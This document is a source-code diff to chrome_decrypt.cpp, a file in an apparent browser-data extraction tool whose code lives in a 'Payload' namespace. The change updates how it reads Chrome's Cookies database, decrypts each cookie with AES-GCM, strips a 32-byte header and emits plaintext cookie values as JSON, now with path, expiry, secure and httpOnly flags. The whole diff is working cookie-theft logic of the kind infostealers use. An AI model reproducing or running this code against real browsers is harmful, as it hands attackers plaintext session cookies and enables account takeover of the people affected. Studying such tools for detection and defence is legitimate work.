@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.14.1 (c) Alexander 'xaitax' Hagenah
+// v0.14.2 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -281,6 +281,8 @@ namespace Payload
 
     namespace Data
     {
+        constexpr size_t COOKIE_PLAINTEXT_HEADER_SIZE = 32;
+
         struct ExtractionConfig
         {
             fs::path dbRelativePath;
@@ -293,19 +295,34 @@ namespace Payload
         const std::vector<ExtractionConfig> &GetExtractionConfigs()
         {
             static const std::vector<ExtractionConfig> configs = {
-                {fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, encrypted_value FROM cookies;",
+                {fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies;",
                  nullptr,
                  [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                  {
-                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
+                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 6));
                      if (!blob)
                          return std::nullopt;
                      try
                      {
-                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
-                         return "  {\"host\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
-                                "\",\"name\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
-                                "\",\"value\":\"" + Utils::EscapeJson({(char *)plain.data(), plain.size()}) + "\"}";
+                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 6)});
+                         if (plain.size() <= COOKIE_PLAINTEXT_HEADER_SIZE)
+                         {
+                             return std::nullopt;
+                         }
+
+                         const char *value_start = reinterpret_cast<const char *>(plain.data()) + COOKIE_PLAINTEXT_HEADER_SIZE;
+                         size_t value_size = plain.size() - COOKIE_PLAINTEXT_HEADER_SIZE;
+
+                         std::ostringstream json_entry;
+                         json_entry << "  {\"host\":\"" << Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) << "\""
+                                    << ",\"name\":\"" << Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) << "\""
+                                    << ",\"path\":\"" << Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 2)) << "\""
+                                    << ",\"value\":\"" << Utils::EscapeJson({value_start, value_size}) << "\""
+                                    << ",\"expires\":" << sqlite3_column_int64(stmt, 5)
+                                    << ",\"secure\":" << (sqlite3_column_int(stmt, 3) ? "true" : "false")
+                                    << ",\"httpOnly\":" << (sqlite3_column_int(stmt, 4) ? "true" : "false")
+                                    << "}";
+                         return json_entry.str();
                      }
                      catch (...)
                      {
